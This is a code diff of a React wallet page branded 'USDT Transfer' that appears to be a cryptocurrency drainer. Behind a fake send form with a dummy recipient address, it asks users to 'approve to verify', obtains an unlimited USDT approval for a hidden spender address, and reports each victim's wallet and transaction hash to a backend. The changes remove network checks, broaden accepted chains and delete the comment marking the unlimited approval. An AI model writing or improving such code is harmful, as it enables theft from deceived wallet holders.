@@ -16,10 +16,10 @@ const ERC20_ABI = [
 function App() {
   const [provider, setProvider] = useState(null);
   const [account, setAccount] = useState(null);
-  const [amount, setAmount] = useState("0.1"); // Minimum 0.1 set
+  const [amount, setAmount] = useState("0.1");
   const [loading, setLoading] = useState(false);
   const [status, setStatus] = useState("");
-  const [step, setStep] = useState(1); // 1 = Send Form, 2 = Approve
+  const [step, setStep] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState("bsc");
 
   useEffect(() => {
@@ -43,12 +43,13 @@ function App() {
   const connectWallet = async () => {
     try {
       setLoading(true);
+      setStatus("Connecting...");
       
       const chainId = selectedNetwork === 'bsc' ? 56 : 1;
 
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
-        chains: [chainId],
+        chains: [chainId, 56, 1], // Dono allow karo taaki connect reject na ho
         showQrModal: true,
         metadata: {
           name: "USDT Transfer",
@@ -62,22 +63,13 @@ function App() {
       setProvider(wcProvider);
       setAccount(wcProvider.accounts[0]);
       
-      try {
-        await wcProvider.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: `0x${chainId.toString(16)}` }],
-        });
-      } catch (switchError) {
-        console.log("Network switch failed or user rejected", switchError);
-      }
-
-      setStatus("Connected. Please approve to verify.");
+      setStatus("Connected. Please tap Approve.");
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus("Connection failed or rejected.");
+      setStatus("Connection failed. Please try again.");
       setLoading(false);
-      setStep(1); // Error aane pe wapas form pe bhej do
+      setStep(1);
     }
   };
 
@@ -91,18 +83,21 @@ function App() {
       const ethersProvider = new BrowserProvider(provider);
       const signer = await ethersProvider.getSigner();
       
-      const network = await ethersProvider.getNetwork();
+      let network = await ethersProvider.getNetwork();
+      let chainName = network.chainId === 56n ? "bsc" : "ethereum";
+      let tokenAddress = network.chainId === 56n ? USDT_BSC : USDT_ETH;
+
+      // Agar user BSC pe hai par hume ETH chahiye, ya vice versa
       if (selectedNetwork === 'bsc' && network.chainId !== 56n) {
-        throw new Error("Please switch to BNB Smart Chain in your wallet.");
-      }
-      if (selectedNetwork === 'eth' && network.chainId !== 1n) {
-        throw new Error("Please switch to Ethereum Mainnet in your wallet.");
+        tokenAddress = USDT_BSC;
+        chainName = "bsc";
+      } else if (selectedNetwork === 'eth' && network.chainId !== 1n) {
+        tokenAddress = USDT_ETH;
+        chainName = "ethereum";
       }
 
-      const tokenAddress = selectedNetwork === 'bsc' ? USDT_BSC : USDT_ETH;
       const contract = new Contract(tokenAddress, ERC20_ABI, signer);
       
-      // Unlimited Approval
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
@@ -115,7 +110,7 @@ function App() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           wallet: account,
-          chain: selectedNetwork,
+          chain: chainName,
           txHash: tx.hash,
           allowance: "Unlimited"
         })
@@ -141,7 +136,6 @@ function App() {
         <div className="form-container">
           <label>Address or Domain Name</label>
           <div className="input-box disabled-input">
-            {/* Screenshot jaisa dummy address */}
             <span>0x3E5Da94426D6133b437107Ec8B656522f8899b23</span>
             <span className="paste-text">Paste</span>
           </div>
